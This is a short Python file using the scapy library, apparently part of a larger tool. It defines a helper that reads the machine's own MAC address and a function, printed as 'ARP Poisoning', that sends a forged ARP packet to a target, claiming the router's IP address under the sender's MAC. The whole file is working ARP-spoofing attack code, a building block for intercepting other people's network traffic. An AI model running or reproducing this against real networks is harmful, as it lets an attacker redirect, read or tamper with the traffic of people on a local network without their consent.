from scapy.all import *
import sys, subprocess, time

from Host import *

def get_mac_address():
    macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in macs:
        if(mac != "00:00:00:00:00:00"):
            return mac

def send_arp(target, router, verbose = False):
    if verbose:
        print("[ARP Poisoning]\nRouter : " + str(router) + "\nTarget = " + str(target) + "\n")
    mac = get_mac_address()
    p = Ether() / ARP(op="who-has", hwsrc=mac, psrc=router.ip, pdst=target.ip)
    sendp(p)
